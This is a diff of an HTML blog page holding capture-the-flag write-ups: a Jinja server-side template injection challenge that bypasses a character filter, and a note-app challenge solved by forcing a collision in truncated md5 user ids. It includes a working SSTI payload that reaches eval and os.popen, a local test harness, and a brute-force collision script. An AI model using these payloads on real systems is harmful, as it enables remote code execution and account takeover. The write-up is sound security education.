-    <p>First I tried just modifying my ninja1 payload to use two different ways of replacing the member accesses (Figure 15). I knew about the first method already, but it didn’t work because <code>getattr</code> is only available in Python and not Jinja. I found out about the second method (using the <code>attr</code> filter) by reading through <a href="https://jinja.palletsprojects.com/en/3.0.x/templates/#builtin-filters">Jinja’s list of builtin filters</a>. The second method also didn’t work (it showed up empty in the dev page) so I tried slowly removing layers of member accesses until I got something that worked. I found that I could get accessing <code>self.__init__.__globals__.__builtins__</code> to work, but if I tried to access any of its members I got back nothing. At this point I spun up a script to allow me to test Jinja payloads locally. This was super valuable because I could get a lot of important information from the error messages.</p> 
-    <pre><code class="language-python">from flask import Flask, render_template_string
+     <p>Figure 15: <em>two possible variants of my ninja1 payloads which avoid the blocked characters.</em></p> 
+     <p>First I tried just modifying my ninja1 payload to use two different ways of replacing the member accesses (Figure 15). I knew about the first method already, but it didn’t work because <code>getattr</code> is only available in Python and not Jinja. I found out about the second method (using the <code>attr</code> filter) by reading through <a href="https://jinja.palletsprojects.com/en/3.0.x/templates/#builtin-filters">Jinja’s list of builtin filters</a>. The second method also didn’t work (it showed up empty in the dev page) so I tried slowly removing layers of member accesses until I got something that worked. I found that I could get accessing <code>self.__init__.__globals__.__builtins__</code> to work, but if I tried to access any of its members I got back nothing. At this point I spun up a script to allow me to test Jinja payloads locally. This was super valuable because I could get a lot of important information from the error messages.</p> 
+     <pre><code class="language-python">from flask import Flask, render_template_string
 
 app = Flask(__name__)
 
@@ -250,10 +256,10 @@ def index():
 
 app.run("0.0.0.0", port=8091)
 </code></pre> 
-    <p>Figure 16: <em>a crude setup for testing Jinja payloads.</em></p> 
-    <p>To use the test script simply modify the value of the <code>template</code> variable, run the script, and visit <code>http://localhost:8091/</code>. You’ll need to re-run the script every time that you edit the template since Flask won’t auto re-run on file change (but if I remember correctly you may able to achieve such behaviour by using the <code>flask</code> cli to run the script).</p> 
-    <p>While trying to find alternative ways to access members of the <code>__builtins__</code> object I realised that I could possibly use Jinja’s for loop block to iterate over the key-value pairs of <code>__builtins__</code> and use an <code>if</code> block to single out the value that I was interested in. It worked! I’m not entirely sure why I ended up going with using <code>eval</code> to run the <code>os.popen</code> phase of the payload, but it was likely just the result of trying out a bunch of options until one worked.</p> 
-    <pre><code class="language-python">{% for k, val in (((self|attr("__init__"))|attr("__globals__"))|attr("items"))() %}
+     <p>Figure 16: <em>a crude setup for testing Jinja payloads.</em></p> 
+     <p>To use the test script simply modify the value of the <code>template</code> variable, run the script, and visit <code>http://localhost:8091/</code>. You’ll need to re-run the script every time that you edit the template since Flask won’t auto re-run on file change (but if I remember correctly you may able to achieve such behaviour by using the <code>flask</code> cli to run the script).</p> 
+     <p>While trying to find alternative ways to access members of the <code>__builtins__</code> object I realised that I could possibly use Jinja’s for loop block to iterate over the key-value pairs of <code>__builtins__</code> and use an <code>if</code> block to single out the value that I was interested in. It worked! I’m not entirely sure why I ended up going with using <code>eval</code> to run the <code>os.popen</code> phase of the payload, but it was likely just the result of trying out a bunch of options until one worked.</p> 
+     <pre><code class="language-python">{% for k, val in (((self|attr("__init__"))|attr("__globals__"))|attr("items"))() %}
   {% if k == "__builtins__" %}
     {% for k2, val2 in (val|attr("items"))() %}
       {% if k2 == "eval" %}
@@ -263,21 +269,21 @@ app.run("0.0.0.0", port=8091)
   {% endif %}
 {% endfor %}
 </code></pre> 
-    <p>Figure 17: <em>the final payload (with line breaks and indentation added for readability).</em></p> 
-    <p>I forgot to write down the flag and can’t find it back 🤦‍♂️, but I promise it worked!</p> 
-    <p>On a high level, my approach was basically just tweak the original payload incrementally until it worked and didn’t include any banned characters 😅 I know, very useful advice.</p> 
-    <h3 id="conclusion">Conclusion</h3> 
-    <p>I had to get quite creative with my solution, well made challenge!</p> 
-    <hr> 
-    <h2 id="coincidence-web---250-points">Coincidence (web - 250 points)</h2> 
-    <blockquote> 
-     <p>Do you have thoughts you’d like to jot down? Well do I have the app for you!</p> 
-     <p>Author: deluqs</p> 
-    </blockquote> 
-    <p>We’re presented with a simple note storage website with the ability to sign up and log in. Importantly, we also get all of the code for the website which is essential for solving this challenge.</p> 
-    <p>Attempting to sign up with <code>stackotter@stackotter.dev</code> gives us an error which notifies us that only BSides BNE users are allowed to sign up. Looking at the code for <code>/signup</code> reveals that this is the result of a check that emails must end with <code>@bsidesbne.com</code>. Simple enough to satisfy.</p> 
-    <p>After signing up with a random <code>@bsidesbne.com</code> email address I poked around and found that I could create notes, view notes, and list all of my created notes. These challenges usually have the contained in the admin’s notes, so I kept that in mind as I looked through the code. My first thought was to try signing up with <code>admin@bsidesbne.com</code>. It was taken, which I assumed meant that that was the admin’s email (although a random player could’ve technically signed up with it). <code>models.py</code> had a <code>generate_uid</code> function which used <code>md5</code> (which should set off alarm bells in any hacker’s head). Let’s take a closer look at <code>models.py</code>.</p> 
-    <pre><code class="language-python">from flask_login import UserMixin
+     <p>Figure 17: <em>the final payload (with line breaks and indentation added for readability).</em></p> 
+     <p>I forgot to write down the flag and can’t find it back 🤦‍♂️, but I promise it worked!</p> 
+     <p>On a high level, my approach was basically just tweak the original payload incrementally until it worked and didn’t include any banned characters 😅 I know, very useful advice.</p> 
+     <h3 id="conclusion">Conclusion</h3> 
+     <p>I had to get quite creative with my solution, well made challenge!</p> 
+     <hr> 
+     <h2 id="coincidence-web---250-points">Coincidence (web - 250 points)</h2> 
+     <blockquote> 
+      <p>Do you have thoughts you’d like to jot down? Well do I have the app for you!</p> 
+      <p>Author: deluqs</p> 
+     </blockquote> 
+     <p>We’re presented with a simple note storage website with the ability to sign up and log in. Importantly, we also get all of the code for the website which is essential for solving this challenge.</p> 
+     <p>Attempting to sign up with <code>stackotter@stackotter.dev</code> gives us an error which notifies us that only BSides BNE users are allowed to sign up. Looking at the code for <code>/signup</code> reveals that this is the result of a check that emails must end with <code>@bsidesbne.com</code>. Simple enough to satisfy.</p> 
+     <p>After signing up with a random <code>@bsidesbne.com</code> email address I poked around and found that I could create notes, view notes, and list all of my created notes. These challenges usually have the contained in the admin’s notes, so I kept that in mind as I looked through the code. My first thought was to try signing up with <code>admin@bsidesbne.com</code>. It was taken, which I assumed meant that that was the admin’s email (although a random player could’ve technically signed up with it). <code>models.py</code> had a <code>generate_uid</code> function which used <code>md5</code> (which should set off alarm bells in any hacker’s head). Let’s take a closer look at <code>models.py</code>.</p> 
+     <pre><code class="language-python">from flask_login import UserMixin
 from hashlib import md5
 from werkzeug.security import generate_password_hash
 from . import db
@@ -308,12 +314,12 @@ class Note(db.Model):
     uid = db.Column(db.String(8), db.ForeignKey('users.id'), nullable=False)
     content = db.Column(db.String(2000))
 </code></pre> 
-    <p>Figure 18: <em>the contents of <code>models.py</code>.</em></p> 
-    <p>The database uses <code>generate_uid</code> to generate the <code>id</code> field of each new user, and also uses this <code>id</code> field to link notes to users. If we can find a way to get the same <code>uid</code> as the admin, we’ll be able to see their notes!</p> 
-    <p>The <code>generate_uid</code> function’s weakness isn’t actually that it uses <code>md5</code>, it’s that it only uses the first 6 characters of the hash (making collisions extremely likely). But even if it used the whole hash, hashes aren’t a very good way of generating database ids. There’s a reason that almost every database uses serial auto-incrementing primary keys.</p> 
-    <p>Forcing a collision to happen is pretty easy because the generated <code>uid</code> is just the first 6 characters of the md5 hash of our email (which we control). This function can only generate 46656 unique ids, which makes finding a collision not only easy, but super fast (it takes less than a second).</p> 
-    <p>Assuming that <code>admin@bsidesbne.com</code> was the email address of the account that we needed to find a collision for, I wrote a quick and dirty Python script (excuse the nesting).</p> 
-    <pre><code class="language-python">from hashlib import md5
+     <p>Figure 18: <em>the contents of <code>models.py</code>.</em></p> 
+     <p>The database uses <code>generate_uid</code> to generate the <code>id</code> field of each new user, and also uses this <code>id</code> field to link notes to users. If we can find a way to get the same <code>uid</code> as the admin, we’ll be able to see their notes!</p> 
+     <p>The <code>generate_uid</code> function’s weakness isn’t actually that it uses <code>md5</code>, it’s that it only uses the first 6 characters of the hash (making collisions extremely likely). But even if it used the whole hash, hashes aren’t a very good way of generating database ids. There’s a reason that almost every database uses serial auto-incrementing primary keys.</p> 
+     <p>Forcing a collision to happen is pretty easy because the generated <code>uid</code> is just the first 6 characters of the md5 hash of our email (which we control). This function can only generate 46656 unique ids, which makes finding a collision not only easy, but super fast (it takes less than a second).</p> 
+     <p>Assuming that <code>admin@bsidesbne.com</code> was the email address of the account that we needed to find a collision for, I wrote a quick and dirty Python script (excuse the nesting).</p> 
+     <pre><code class="language-python">from hashlib import md5
 
 admin_email = "admin@bsidesbne.com"
 hash = md5(admin_email.encode('utf-8')).hexdigest()[:6]
@@ -332,12 +338,13 @@ for a in chars:
                                     print(email)
                                     exit(0)
 </code></pre> 
-    <p>Figure 19: <em>the collision finding script.</em></p> 
-    <p>The script essentially just generates a bunch of random <code>@bsidesbne.com</code> email addresses and compares the generated <code>uid</code>s with the generated <code>uid</code> for <code>admin@bsidesbne.com</code>. The colliding email that I found was <code>aaackp06@bsidesbne.com</code>. Signing up with this email presented me with a single note containing the flag.</p> 
-    <p>Flag: <code>flag{h4ndm4d3-1dEntif13rs-ar3-b4d}</code> (yes they are)</p> 
-    <h3 id="conclusion">Conclusion</h3> 
-    <p>Super fun code-review style challenge! We did have to guess that the admin’s email was <code>admin@bsidesbne.com</code>, but in my opinion that made the challenge more realistic without making it too guessy, which I always appreciate (it was a pretty obvious guess).</p> 
-   </div> 
-  </main>    
+     <p>Figure 19: <em>the collision finding script.</em></p> 
+     <p>The script essentially just generates a bunch of random <code>@bsidesbne.com</code> email addresses and compares the generated <code>uid</code>s with the generated <code>uid</code> for <code>admin@bsidesbne.com</code>. The colliding email that I found was <code>aaackp06@bsidesbne.com</code>. Signing up with this email presented me with a single note containing the flag.</p> 
+     <p>Flag: <code>flag{h4ndm4d3-1dEntif13rs-ar3-b4d}</code> (yes they are)</p> 
+     <h3 id="conclusion">Conclusion</h3> 
+     <p>Super fun code-review style challenge! We did have to guess that the admin’s email was <code>admin@bsidesbne.com</code>, but in my opinion that made the challenge more realistic without making it too guessy, which I always appreciate (it was a pretty obvious guess).</p> 
+    </div> 
+   </main> 
+  </div>   
  </body>
 </html>
